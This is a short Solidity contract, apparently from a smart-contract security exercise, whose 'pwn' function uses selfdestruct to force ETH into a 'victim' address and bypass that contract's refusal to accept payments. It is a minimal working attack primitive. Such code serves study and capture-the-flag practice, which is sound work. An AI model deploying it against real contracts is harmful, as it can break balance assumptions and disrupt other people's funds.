// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract ForceSendETH {
    function pwn(address victim) external payable {
        selfdestruct(payable(victim));
    }
}
